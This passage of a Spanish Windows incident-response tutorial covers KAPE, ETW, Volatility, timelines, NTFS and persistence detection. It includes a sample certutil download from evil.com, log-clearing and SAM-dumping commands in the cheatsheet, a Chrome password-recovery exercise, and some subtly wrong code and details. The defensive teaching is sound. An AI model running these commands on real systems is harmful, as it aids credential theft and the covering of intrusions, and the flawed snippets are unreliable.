      <File>%UserProfile%\AppData\Local\Microsoft\Windows\*\USRCLASS.DAT</File>
    </Files>
  </Target>
</Targets>
```

### 7.4 Batch Processing con KAPE

```powershell
# Script automatizado de recoleccion:
$date = Get-Date -Format "yyyyMMdd-HHmmss"
$case = "INCIDENTE_001"
$output = "D:\CASOS\$case\$date"

# Fase 1: Recoleccion
kape.exe --tsource C:\ --tdest "$output\Raw" `
    --target !SANS_Triage, !USB_Devices, !Browser_History

# Fase 2: Procesamiento
kape.exe --msource "$output\Raw" --mdest "$output\Processed" `
    --module !EzParser

# Fase 3: Comprimir resultados
Compress-Archive -Path "$output\*" -DestinationPath "$output\$case.zip"
```

### 7.5 Ejercicios Practicos

**Ejercicio 7.1:** Configura KAPE para recolectar targets de un sistema Windows en un pendrive. Ejecuta la recoleccion.

**Ejercicio 7.2:** Crea un target personalizado que recolecte artefactos especificos de persistence mechanisms (Run keys, Scheduled Tasks, Services).

---

## 8. [etw](../raw/3dr-3v4s10n.md#etw) (Event Tracing for Windows)

### 8.1 Arquitectura ETW

ETW es un framework de tracing del [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos):

```bash
# Componentes ETW:
# 1. Providers: Fuentes de eventos
#    - Kernel Provider: process, thread, network, file I/O
#    - Microsoft-Windows-Kernel-Process: Process/Thread creation
#    - Microsoft-Windows-Kernel-File: File operations
#    - Microsoft-Windows-Kernel-Network: Network events
#    - Microsoft-Windows-TCPIP: TCP/IP stack

# 2. Controllers: Inician/paran sesiones de tracing
#    - logman.exe
#    - xperf.exe
#    - WPR (Windows Performance Recorder)

# 3. Consumers: Procesan eventos
#    - Windows Event Viewer
#    - PowerShell (Get-WinEvent)
#    - SilkETW
#    - Chainsaw
```

### 8.2 Comandos ETW

```powershell
# Listar proveedores ETW
logman query providers

# Listar sesiones activas
logman query -ets

# Iniciar sesion de tracing
logman start MySession -ets -o C:\traza.etl `
    -p "Microsoft-Windows-Kernel-Process" 0x10 0xFF

# Crear sesion con multiples proveedores
logman start ForensicSession -ets -o D:\ETL\forensic.etl `
    -p "Microsoft-Windows-Kernel-Process" `
    -p "Microsoft-Windows-Kernel-File" `
    -p "Microsoft-Windows-TCPIP"

# Detener sesion
logman stop ForensicSession -ets

# Convertir .etl a texto
tracerpt C:\traza.etl -o C:\traza.xml -of XML
tracerpt C:\traza.etl -o C:\traza.csv -of CSV
```

### 8.3 SilkETW

```powershell
# SilkETW: Herramienta poderosa para ETW
# Descargar de GitHub

# Ejemplo: Capturar eventos de proceso
SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process `
    -ot file -p C:\etw_output.json

# Capturar todos los proveedores de kernel
SilkETW.exe -t kernel -kk all -ot file -p kernel_trace.etl

# Capturar multiples proveedores
SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process `
    -pn Microsoft-Windows-Kernel-File -pn Microsoft-Windows-Security-Auditing `
    -ot file -p security_trace.json
```

### 8.4 Utilidad [forense](../raw/w1n-f0r3ns1cs.md#forense) de ETW

```bash
# ETW permite capturar:
# - Process creation (antes que EventID 4688)
# - File operations (archivos abiertos, creados, borrados)
# - Network connections (sin necesidad de driver)
# - Registry operations (modificaciones en vivo)
# - PowerShell execution (antes de ScriptBlock logging)
# - DLL loading

# Ventajas forenses:
# - Logging inmediato (sin buffer como Security log)
# - Puede capturar eventos que Security log no
# - Kernel-level visibility
# - Poco overhead en produccion

# Desventajas:
# - Requiere configuracion previa
# - Genera muchos datos
# - No es persistente por defecto (hay que iniciar la sesion)
```

### 8.5 ETWTI (ETW Tampering Indicators)

```bash
# Atacantes pueden parar ETW:
# - EtwEventWrite patch
# - EtwEventRegister patch

# Deteccion de ETW patching:
# - Buscar inlines hooks en ntdll!EtwEventWrite
# - Volatility: apihooks
# - Chainsaw: reglas de ETW tampering
```

### 8.6 Ejercicios Practicos

**Ejercicio 8.1:** Inicia una sesion ETW que capture eventos del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) (process, file, network). Ejecuta un binario y analiza los eventos generados.

**Ejercicio 8.2:** Usa SilkETW para capturar eventos de [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) en tiempo real. Crea reglas para detectar ejecucion de herramientas de hacking.

---

## 9. Memory Analysis con Volatility

### 9.1 Captura de Memoria RAM

```powershell
# Opciones de captura:

# winpmem (recomendado)
winpmem.exe -o memory.raw

# DumpIt (simple)
DumpIt.exe

# FTK Imager
# File -> Capture Memory

# Magnet RAM Capture
RAMCapture64.exe

# Verificar dump:
python3 vol.py -f memory.raw windows.info
```

### 9.2 Volatility 3 Plugins Esenciales

```bash
# === PROCESS ANALYSIS ===

# Listar procesos
vol -f memory.raw windows.psscan          # Pool scanning (DKOM resistant)
vol -f memory.raw windows.pslist          # Lista EPROCESS
vol -f memory.raw windows.pstree          # Arbol de procesos

# Detalle de proceso
vol -f memory.raw windows.cmdline --pid 1234
vol -f memory.raw windows.cmdline.CmdLine
vol -f memory.raw windows.envars --pid 1234
vol -f memory.raw windows.dlllist --pid 1234
vol -f memory.raw windows.handles --pid 1234

# === NETWORK ANALYSIS ===
vol -f memory.raw windows.netscan         # Conexiones de red
vol -f memory.raw windows.netstat         # Netstat from memory

# === FILE ANALYSIS ===
vol -f memory.raw windows.filescan        # File objects in memory
vol -f memory.raw windows.mftscan         # MFT entries
vol -f memory.raw windows.dumpfiles --pid 1234  # Dump process files

# === MEMORY ANALYSIS ===
vol -f memory.raw windows.malfind         # Buscar inyecciones
vol -f memory.raw windows.vadinfo         # VAD info
vol -f memory.raw windows.vadwalk         # Walk VAD tree
vol -f memory.raw windows.modules         # Kernel modules
vol -f memory.raw windows.modscan         # Module scan

# === REGISTRY ===
vol -f memory.raw windows.registry.hives  # Hives cargados
vol -f memory.raw windows.registry.userassist  # UserAssist
vol -f memory.raw windows.registry.cmdline  # Command line history

# === ROOTKIT DETECTION ===
vol -f memory.raw windows.callbacks       # Kernel callbacks
vol -f memory.raw windows.ssdt            # SSDT check
vol -f memory.raw windows.idt             # IDT check
vol -f memory.raw windows.driverirp        # Driver IRP hooks
vol -f memory.raw windows.apihooks         # API hooks
vol -f memory.raw windows.timers           # Kernel timers
```

### 9.3 Deteccion de Malware en Memoria

```python
# malfind: Busca evidencia de inyeccion de codigo
# - VADs con permisos RWX
# - VADs que apuntan a memoria no mapeada
# - Codigo ejecutable que no corresponde a modulos

# Indicadores de proceso comprometido:
# 1. Private memory con permisos RWX
# 2. DLLs inyectadas (no listadas en PEB pero si en VAD)
# 3. Threads con StartAddress fuera de modulos
# 4. Proceso oculto (en EPROCESS pero no en PsActiveProcessHead)
# 5. PEB dubstep pattern
```

### 9.4 Process Hollowing Detection

```python
# Tecnica: Crear proceso legitimo, reemplazar su memoria
# 
# 1. CreateProcess (suspendido) -> svchost.exe
# 2. NtUnmapViewOfSection (descargar svchost.exe)
# 3. VirtualAllocEx (asignar memoria)
# 4. WriteProcessMemory (escribir payload)
# 5. SetThreadContext -> ResumeThread

# Detection con Volatility:
# 1. windows.psscan - buscar procesos con ImageFileName != PEB.ImageBase
# 2. windows.dlllist - comparar con lista esperada
# 3. windows.malfind - detectar secciones anomalas
# 4. windows.vadinfo - permisos inusuales
```

### 9.5 Memory Artifacts

```bash
# Artefactos que quedan en memoria:

# 1. Command line arguments
#    - windows.cmdline --pid <PID>

# 2. Notepad text (no guardado)
#    - windows.notepad

# 3. Clipboard content
#    - windows.clipboard

# 4. Network connections
#    - windows.netscan

# 5. Encryption keys/material
#    - Buscar en heap del proceso

# 6. Deleted files content
#    - windows.mftscan -> archivos borrados

# 7. Registry values in-use
#    - windows.registry.printkey
```

### 9.6 Dump de Procesos

```python
# Dump completo de proceso:
vol -f memory.raw windows.dumpfiles --pid 1234 -o dump_dir/

# Dump de DLL especifica:
vol -f memory.raw windows.dumpfiles --virtaddr 0x7ffa0000 -o dump_dir/

# Analizar dump:
strings dump.exe | grep -i "password\|secret\|token"
```

### 9.7 Verificacion de Dump

```python
# Verificar que el dump es valido:
vol -f memory.raw windows.info

# Output esperado:
# Memory layer: WindowsCrashDump
# Number of processors: 4
# Image type: Memory dump (full)
# Kernel base: 0xf800000000000000
# System time: 2024-05-24 14:30:22
```

### 9.8 Ejercicios Practicos

**Ejercicio 9.1:** Captura RAM de una maquina infectada (simulacion). Usa Volatility para: listar procesos, detectar conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md), buscar inyecciones.

**Ejercicio 9.2:** Simula process hollowing en un entorno de pruebas. Captura RAM y usa Volatility para detectar la inyeccion.

**Ejercicio 9.3:** Analiza un memory dump de notepad.exe para recuperar texto no guardado que el usuario escribio.

---

## 10. Timeline Analysis

### 10.1 Concepto de Timeline [forense](../raw/w1n-f0r3ns1cs.md#forense)

Una timeline (o super timeline) es una linea de tiempo de todos los eventos ocurridos en un sistema:

```bash
# Eventos a incluir en una timeline:

# Filesystem Events:
# - MFT: Creacion, modificacion, acceso de archivos
# - USN Journal: Cambios en el filesystem
# - $LogFile: Transacciones NTFS

# Execution Events:
# - Prefetch: Ejecucion de programas
# - ShimCache/AmCache: Ejecucion de programas
# - UserAssist: Ejecucion via Explorer
# - RecentFileCache: Archivos recientes

# System Events:
# - Event Logs: Logons, procesos, servicios
# - SRUM: Network usage, CPU, RAM
# - Registry: Cambios en configuracion

# User Activity:
# - LNK files: Accesos directos
# - JumpLists: Jump lists
# - Browser History: Historial web
# - MRU: Mas recientemente usado
# - Typed URLs: URLs escritas
```

### 10.2 Construccion de Timeline con Plaso

```bash
# Plaso (log2timeline) es el estandar para timelines

# Fase 1: Recolectar artefactos
# (KAPE o manual)

# Fase 2: Crear almacenamiento Plaso
log2timeline.exe --storage-file forensic.plaso C:\artifacts

# Fase 3: Exportar a CSV/JSON
psort.exe -o l2tcsv -w timeline.csv forensic.plaso
psort.exe -o json -w timeline.json forensic.plaso

# Fase 4: Filtrar y analizar
# timeline.csv se puede abrir en Excel/Timeline Explorer
```

### 10.3 Timeline Explorer

```powershell
# Timeline Explorer (Eric Zimmerman):
# Herramienta para visualizar timelines CSV

# Capacidades:
# - Filtros por fecha, tipo, archivo
# - Busqueda de texto
# - Agrupacion por categoria
# - Exportacion de resultados
# - Bookmarks

# Uso tipico:
# 1. Exportar timeline de Plaso
# 2. Abrir en Timeline Explorer
# 3. Filtrar por rango de fechas del incidente
# 4. Identificar eventos anomalos
```

### 10.4 Super Timeline Manual

```powershell
# Tambien se puede construir manualmente combinando artefactos:

# 1. Parsear MFT
MFTECmd.exe -f "C:\$MFT" --csv mft.csv

# 2. Parsear USN
MFTECmd.exe -f "C:\$Extend\$UsnJrnl\$J" --csv usn.csv

# 3. Parsear Prefetch
PECmd.exe -d C:\Windows\Prefetch --csv prefetch.csv

# 4. Parsear Event Logs
wevtutil epl Security sec.evtx  # Exportar
EvtxECmd.exe -f sec.evtx --csv events.csv

# 5. Combinar todos los CSV
$csvs = @("mft.csv", "usn.csv", "prefetch.csv", "events.csv")
$combined = $csvs | ForEach-Object { Import-Csv $_ }
$combined | Export-Csv full_timeline.csv -NoTypeInformation
```

### 10.5 TimeSource Priority

Cuando hay conflictos de tiempo entre artefactos:

```bash
# Orden de confiabilidad (mejor a peor):
# 1. MFT timestamps ($STANDARD_INFORMATION, $FILE_NAME)
# 2. USN Journal timestamps
# 3. Event Log timestamps
# 4. Prefetch timestamps
# 5. ShimCache timestamps
# 6. Registry timestamps (last write times)
```

### 10.6 TimeSkew Analysis

```powershell
# Verificar desviacion de tiempo del sistema:
# 1. Comparar Event Log time vs MFT time
# 2. Buscar eventos correlacionados

# Detectar time stomping:
# $STANDARD_INFORMATION vs $FILE_NAME timestamps
# Si difieren mucho -> possible timestamp manipulation

# Tool:
MFTECmd.exe -f "C:\$MFT" --de 0x10 --de 0x30 --csv $MFT_detail.csv
# Comparar SI (0x10) vs FN (0x30) timestamps
```

### 10.7 Ejercicios Practicos

**Ejercicio 10.1:** Construye una super timeline con Plaso usando al menos 5 tipos de artefactos. Identifica actividad del usuario en un rango de horas especifico.

**Ejercicio 10.2:** Analiza una timeline buscando patrones de ataque: ejecucion de herramientas, logons fuera de horario, creacion de archivos en temp.

---

## 11. MFT y NTFS Forensics

### 11.1 Estructura de la MFT

```bash
# Master File Table: Corazon de NTFS
# Cada archivo/carpeta tiene al menos un record

# Records fijos de MFT:
# 0: $MFT (la MFT misma)
# 1: $MFTMirr (copia de seguridad de MFT)
# 2: $LogFile (transacciones)
# 3: $Volume (informacion del volumen)
# 4: $AttrDef (definiciones de atributos)
# 5: . (root directory)
# 6: $Bitmap (mapa de clusters libres)
# 7: $Boot (sector de boot)
# 8: $BadClus (clusters danados)
# 9: $Secure (security descriptors)
# 10: $UpCase (tabla de mayusculas)
# 11: $Extend (extension records)
```

### 11.2 MFT Record Structure

```c
typedef struct {
    CHAR Signature[4];        // "FILE" o "BAAD"
    USHORT FixupOffset;       // Fixup array offset
    USHORT FixupCount;        // Fixup count
    USHORT LSN;               // Log file sequence number
    USHORT SequenceNumber;    // Sequence number
    USHORT LinkCount;         // Hard link count
    USHORT AttributeOffset;   // First attribute offset
    USHORT Flags;             // Record flags
    ULONG BytesInUse;         // Bytes in use
    ULONG BytesAllocated;     // Bytes allocated
    ULONGLONG BaseRecord;    // Base record (for resident attributes)
    USHORT NextAttributeId;  // Next attribute ID
} MFT_RECORD;
```

### 11.3 MFT Flags

| Flag | Valor | Significado |
|------|-------|-------------|
| MFT_RECORD_IN_USE | 0x0001 | Record en uso |
| MFT_RECORD_IS_DIRECTORY | 0x0002 | Es un directorio |
| MFT_RECORD_IS_VIEW_INDEX | 0x0004 | View index |
| MFT_RECORD_IS_EXTENDED | 0x0008 | Tiene attributes no residentes |

### 11.4 Atributos de MFT

| Type ID | Atributo | Descripcion |
|---------|----------|-------------|
| 0x10 | $STANDARD_INFORMATION | Timestamps, flags (SI) |
| 0x20 | $ATTRIBUTE_LIST | Lista de atributos |
| 0x30 | $FILE_NAME | Nombre del archivo (FN) |
| 0x40 | $OBJECT_ID | Object ID |
| 0x50 | $SECURITY_DESCRIPTOR | [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) |
| 0x60 | $VOLUME_NAME | Nombre del volumen |
| 0x70 | $VOLUME_INFORMATION | Info del volumen |
| 0x80 | $DATA | Datos del archivo |
| 0x90 | $INDEX_ROOT | Root de indices |
| 0xA0 | $INDEX_ALLOCATION | Indices no residentes |
| 0xB0 | $BITMAP | Bitmap del index |
| 0xC0 | $REPARSE_POINT | Symlink/junction |
| 0xD0 | $EA_INFORMATION | Extended attributes info |
| 0xE0 | $EA | Extended attributes |
| 0xF0 | $LOGGED_UTILITY_STREAM | Propiedades |

### 11.5 SI vs FN Timestamps

```bash
# $STANDARD_INFORMATION (0x10):
# - Creado por Win32 API
# - Modificable por programas (incluyendo timestomping tools)
# - 4 timestamps: MACE (Modified, Accessed, Created, Entry Modified)

# $FILE_NAME (0x30):
# - Creado por NTFS cuando se crea/renombra el archivo
# - Solo modificable por NTFS driver
# - Mas confiable para forensica
# - Mismos 4 timestamps pero mas precisos

# Diferencia SI vs FN = indicio de timestomping:
MFTECmd.exe -f "C:\$MFT" --de 0x10 --de 0x30 --csv mft_compare.csv
```

### 11.6 TimeStomping Detection

```python
def detect_timestomp(mft_records):
    suspicious = []
    for record in mft_records:
        si = record['STANDARD_INFORMATION']
        fn = record['FILE_NAME']
        
        # Si timestamps difieren significativamente
        if abs(si['modified'] - fn['modified']) > 3600:  # > 1 hora
            suspicious.append({
                'name': record['name'],
                'si_modified': si['modified'],
                'fn_modified': fn['modified'],
                'diff_seconds': abs(si['modified'] - fn['modified'])
            })
    return suspicious
```

### 11.7 Ejercicios Practicos

**Ejercicio 11.1:** Parsea la MFT de un volumen con MFTECmd. Identifica archivos borrados (MFT record con flag 0x00).

**Ejercicio 11.2:** Busca evidencia de timestomping (diferencia SI vs FN mayor a 5 minutos).

---

## 12. Browser Forensics

### 12.1 Chrome Forensics

```bash
# Ubicacion: %UserProfile%\AppData\Local\Google\Chrome\User Data\Default\

# Base de datos SQLite:
# - History: Historial de navegacion
# - Bookmarks: Favoritos
# - Cookies: Cookies
# - Login Data: Credenciales guardadas
# - Web Data: Autofill
# - Favicons: Favicon cache
# - Top Sites: Sitios populares
# - Origin Triples: Permisos
```

```python
# Analizar historial de Chrome
import sqlite3

def analyze_chrome_history(db_path):
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT url, title, visit_count, 
               datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit,
               datetime(visit_time/1000000-11644473600, 'unixepoch') as visit_time
        FROM urns JOIN visits ON urls.id = visits.url
        ORDER BY visit_time DESC
        LIMIT 100
    """)
    
    return cursor.fetchall()
```

### 12.2 Firefox Forensics

```bash
# Ubicacion: %AppData%\Roaming\Mozilla\Firefox\Profiles\

# Archivos:
# - places.sqlite: Historial y marcadores
# - cookies.sqlite: Cookies
# - signons.sqlite: Credenciales
# - formhistory.sqlite: Formularios
# - downloads.sqlite: Descargas
```

### 12.3 Edge/IE Forensics

```bash
# Edge (Chromium version):
# %LocalAppData%\Microsoft\Edge\User Data\Default\

# Edge Legacy:
# %LocalAppData%\Microsoft\Edge\User Data\Default\Web Database

# Internet Explorer:
# %UserProfile%\AppData\Local\Microsoft\Windows\WebCache\
# Registry: TypedURLs, etc.
```

### 12.4 Ejercicios Practicos

**Ejercicio 12.1:** Extrae el historial de Chrome de un sistema. Identifica sitios visitados en un rango de tiempo especifico.

**Ejercicio 12.2:** Recupera credenciales guardadas de Chrome (Login Data) y descifra las passwords con herramientas forenses.

---

## 13. Network Forensics Windows

### 13.1 [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) Logging

```powershell
# Habilitar logging de firewall:
netsh advfirewall set currentprofile logging filename C:\Windows\System32\LogFiles\Firewall\pfirewall.log
netsh advfirewall set currentprofile logging droppedconnections enable
netsh advfirewall set currentprofile logging allowedconnections enable
```

### 13.2 SRUM (System Resource Usage Monitor)

```bash
# SRUM registra uso de recursos de aplicaciones:
# - Network usage (bytes enviados/recibidos)
# - CPU time
# - RAM usage

# Ubicacion: %SystemRoot%\System32\sru\SRUDB.dat
# Formato: ESE Database (Extensible Storage Engine)

# Herramientas:
SrumECmd.exe (Eric Zimmerman)
python3 srum-dump.py
```

### 13.3 Windows Filtering Platform

```bash
# WFP es la API de filtrado de red de Windows
# Puede ser usada para registrar conexiones

# Comandos de diagnostico:
netsh wfp show sessions
netsh wfp show state
netsh wfp show filters
```

### 13.4 Ejercicios Practicos

**Ejercicio 13.1:** Analiza SRUM para identificar que aplicaciones consumieron mas ancho de banda en un periodo.

**Ejercicio 13.2:** Configura firewall logging y luego genera trafico malicioso (simulado). Analiza los logs.

---

## 14. Malware Persistence Detection

### 14.1 Auto-Start Locations

```powershell
# === PERSISTENCE LOCATIONS ===

# RUN Keys (HKCU and HKLM):
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Startup Folder:
$startup = [Environment]::GetFolderPath('Startup')
Get-ChildItem $startup
$startup_all = [Environment]::GetFolderPath('CommonStartup')
Get-ChildItem $startup_all

# Services:
Get-CimInstance Win32_Service | Where-Object StartMode -eq Auto

# Scheduled Tasks:
Get-ScheduledTask | Where-Object State -eq Ready

# AppInit_DLLs:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -Name AppInit_DLLs

# Winlogon:
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name Shell

# Boot Execute:
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager" -Name BootExecute

# Image File Execution Options (IFEO):
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"

# COM/OLE Registration:
Get-ChildItem "HKCU:\Software\Classes\CLSID"
Get-ChildItem "HKLM:\SOFTWARE\Classes\CLSID"

# Browser Helper Objects (BHO):
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"

# WMI Persistence:
# __FilterToConsumerBinding in root/subscription
```

### 14.2 Persistence Detection Script

```powershell
# Script de deteccion de persistencia:
$results = @()

# Run Keys
$runPaths = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
)

foreach ($path in $runPaths) {
    if (Test-Path $path) {
        Get-ItemProperty $path | Get-Member -MemberType NoteProperty |
            ForEach-Object {
                $results += [PSCustomObject]@{
                    Location = $path
                    Name = $_.Name
                    Value = (Get-ItemProperty $path).$($_.Name)
                }
            }
    }
}

# Startup Folder
$startupFolders = @(
    [Environment]::GetFolderPath('Startup'),
    [Environment]::GetFolderPath('CommonStartup')
)

foreach ($folder in $startupFolders) {
    Get-ChildItem $folder -ErrorAction SilentlyContinue |
        ForEach-Object {
            $results += [PSCustomObject]@{
                Location = $folder
                Name = $_.Name
                Value = $_.FullName
            }
        }
}

$results | Export-Csv persistence_check.csv -NoTypeInformation
```

### 14.3 Ejercicios Practicos

**Ejercicio 14.1:** Crea un script que escanee todas las ubicaciones de [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) conocidas en un sistema Windows y genere un reporte.

**Ejercicio 14.2:** Instala un malware (simulado) que use persistencia via Run key. Detectalo con tu script.

---

## 15. Ejercicios Practicos

### Ejercicio 15.1: Investigacion Completa de Incidente

Simula un incidente de seguridad:
1. Ejecuta un binario malicioso en un entorno de pruebas
2. Captura RAM con winpmem
3. Recolecta artefactos con KAPE
4. Analiza con Volatility: procesos, conexiones, inyecciones
5. Analiza registros de eventos: logons, creacion de procesos
6. Construye una timeline del incidente
7. Identifica el vector de entrada, [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia), y datos exfiltrados

### Ejercicio 15.2: Búsqueda de Amenazas ([threat hunting](../raw/thr3t-hnt.md))

Usa las siguientes tecnicas para buscar indicadores de compromiso:
1. Busca ejecucion de herramientas de hacking en [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch)
2. Analiza [event logs](../raw/w1n-f0r3ns1cs.md#event-logs) para detectar pass-the-[hash](../raw/w1nd0ws-p0st3xpl01t.md#pass-the-hash) (4624 + 4648)
3. Busca procesos con conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md) a [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) sospechosas
4. Analiza persistencia en Run keys y Scheduled Tasks
5. Detecta posibles time stomping (SI vs FN en MFT)

### Ejercicio 15.3: Script de Automatización

Crea un script en [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) que automatice:
1. Recoleccion de artefactos basicos
2. Parseo con herramientas de Eric Zimmerman
3. Generacion de timeline CSV
4. Reporte HTML con hallazgos

---

## 16. Apéndice: Cheatsheet

```bash
# === LIVE RESPONSE ===
netstat -anob > net.txt
tasklist /v /fo csv > procs.csv
wmic process list full > procs_wmi.txt
reg save HKLM\SAM SAM.hive
reg save HKLM\SYSTEM SYSTEM.hive
wevtutil epl Security sec.evtx

# === VOLATILITY 3 ===
vol -f memory.raw windows.psscan
vol -f memory.raw windows.netscan
vol -f memory.raw windows.malfind
vol -f memory.raw windows.registry.hives

# === KAPE ===
kape --tsource C:\ --tdest D:\out --target !SANS_Triage
kape --msource D:\out --mdest D:\proc --module !EzParser

# === MFT/USN ===
MFTECmd.exe -f "C:\$MFT" --csv mft.csv
MFTECmd.exe -f "C:\$Extend\$UsnJrnl\$J" --csv usn.csv

# === PREFETCH ===
PECmd.exe -d C:\Windows\Prefetch --csv prefetch.csv

# === REGISTRY ===
AppCompatCacheParser.exe --csv shimcache.csv -f SYSTEM.hive
AmCacheParser.exe -f AmCache.hve --csv amcache.csv
RECmd.exe --HivesFolder . --nl all --csv registry.csv

# === EVENT LOGS ===
EvtxECmd.exe -f Security.evtx --csv events.csv
chainsaw hunt Security.evtx -r rules/

# === SRUM ===
SrumECmd.exe -f "C:\System32\sru\SRUDB.dat" --csv srum.csv

# === TIMELINE ===
log2timeline.exe --storage-file case.plaso C:\case_files
psort.exe -o l2tcsv -w timeline.csv case.plaso

# === PERSISTENCE ===
Autoruns64.exe -a -h -s -c -o autoruns.csv

# === ETW ===
logman start Forensic -ets -o forensic.etl -p "Microsoft-Windows-Kernel-Process"
SilkETW.exe -t kernel -kk all -ot file -p kernel.etl

# === BORRADO DE LOGS (detectar) ===
wevtutil cl Security
wevtutil cl System
sc stop EventLog
```

### Glosario de Artefactos

| Artefacto | Ubicacion | Que Revele | Herramienta |
|---|---|---|---|
| [prefetch](../raw/w1n-f0r3ns1cs.md#prefetch) | %SystemRoot%\[prefetch](../raw/w1n-f0r3ns1cs.md#prefetch)\ | Ejecucion de programas | PECmd |
| ShimCache | SYSTEM hive | Ejecucion de archivos | AppCompatCacheParser |
| [amcache](../raw/w1n-f0r3ns1cs.md#amcache) | %SystemRoot%\AppCompat\Programs\ | Instalacion/ejecucion | AmCacheParser |
| USN Journal | $Extend\$UsnJrnl | Cambios en filesystem | MFTECmd |
| MFT | $MFT | Todos los archivos | MFTECmd |
| Security Log | System32\winevt\Logs\ | Logons, procesos | EvtxECmd |
| SRUM | System32\sru\SRUDB.dat | Network usage | SrumECmd |
| UserAssist | NTUSER.DAT | Ejecucion via Explorer | RECmd |
| LNK Files | %UserProfile%\Recent\ | Archivos abiertos | LECmd |
| JumpLists | AppData\Roaming\Microsoft\Windows\Recent\ | Ultimos usados | JLECmd |
| Registry Hives | System32\config\ | Configuracion del sistema | RECmd |

### Referencias

- Eric Zimmerman Tools: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://ericzimmerman.github.io
- Volatility 3: https://github.[com](../raw/w1n-s9bsyst3ms.md#com)/volatilityfoundation/volatility3
- KAPE: https://www.kroll.com/en/services/cyber-risk/kroll-artifact-parser-extractor-kape
- Plaso: https://github.com/log2timeline/plaso
- Chainsaw: https://github.com/WithSecureLabs/chainsaw
- [sysmon](../raw/3dr-3v4s10n.md#sysmon): https://docs.microsoft.com/en-us/sysinternals/downloads/[sysmon](../raw/3dr-3v4s10n.md#sysmon)
- SANS DFIR: https://www.sans.org/white-papers/32977/

### 17.1 [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Forensics Avanzada

```powershell
# Analisis de scripts PowerShell ofuscados:

# 1. Decodificar base64
$encoded = "JABhACAAPQAgACcAaABlAGwAbABvACcA"
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 2. Deobfuscacion de cadenas con split/join
$obfuscated = "H".e+l+".l+".l+".o"
$deobfuscated = $obfuscated -split '\+' -join ''

# 3. Detectar compression + base64
$compressed = [System.Convert]::FromBase64String($b64)
$decompressed = [System.IO.Compression.GZipStream]::New(
    [System.IO.MemoryStream]::New($compressed),
    [System.IO.Compression.CompressionMode]::Decompress
)

# 4. Tracing de ejecucion de PowerShell
$scriptBlock = [ScriptBlock]::Create($maliciousCode)
$scriptBlock.Debugger.Break()  # Forzar pausa en debugger
```

### 17.2 LNK File Forensics

```powershell
# Los atajos LNK contienen metadatos valiosos:
# - Path del target
# - Working directory
# - Icon location
# - Hotkey
# - Show state
# - Machine ID
# - Volume serial number
# - MAC address (en NetBIOS)
# - Timestamps (creation, access, write)

# Herramientas:
LECmd.exe -f "C:\Users\user\Desktop\malware.lnk" --csv output.csv

# Campos clave:
# TargetFile: C:\Windows\System32\cmd.exe
# CommandArgs: /c certutil -urlcache -f http://evil.com/payload.exe
# MachineID: WORKSTATION-01
# MacAddress: 00-11-22-33-44-55
# VolumeSerial: AAAA-BBBB
```

### 17.3 JumpLists Forensics

```powershell
# JumpLists son listas de archivos recientes por aplicacion
# Ubicacion: %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\
# Formato: AppID.automaticDestinations-ms

# AppIDs comunes:
# {1b14cd61-39f7-4e7b-8ad8-090b0eb722be}: Notepad
# {9b1e6a2c-16e4-4a8e-9e3d-4f8b5af5b8a3}: Word
# {91af5f1c-1f5e-4b0f-8e7d-5f5b0d8c1234}: Chrome

# Herramienta:
JLECmd.exe -d "C:\Users\user\AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations" --csv output.csv

# Informacion:
# - AppID → aplicacion
# - Path al archivo
# - Accessed time
# - Modified time
# - Creation time
```

### 17.4 SRUM (System Resource Usage Monitor) Forensics

```powershell
# SRUM registra uso de recursos por aplicacion:
# - Network data (bytes sent/received)
# - CPU time
# - RAM usage
# - Energy consumption

# Ubicacion: %SystemRoot%\System32\sru\SRUDB.dat
# Formato: ESE Database

# Herramientas:
SrumECmd.exe -f "C:\Windows\System32\sru\SRUDB.dat" --csv output.csv

# Identificar:
# - Aplicaciones que usaron mas red (posible exfiltracion)
# - Aplicaciones corriendo en horarios inusuales
# - Aplicaciones con alto consumo de CPU (mineria)
```

### 17.5 Windows Error Reporting (WER) Forensics

```powershell
# WER guarda dumps y reportes de errores
# Ubicacion: %ProgramData%\Microsoft\Windows\WER\
# ReportArchive: Reportes archivados por aplicacion
# ReportQueue: Reportes pendientes de envio

# Cada reporte contiene:
# - Version del OS
# - Nombre de la aplicacion que fallo
# - Module que causo el error (con version)
# - Exception code
# - Stack trace (en dumps)
# - Archivos relacionados

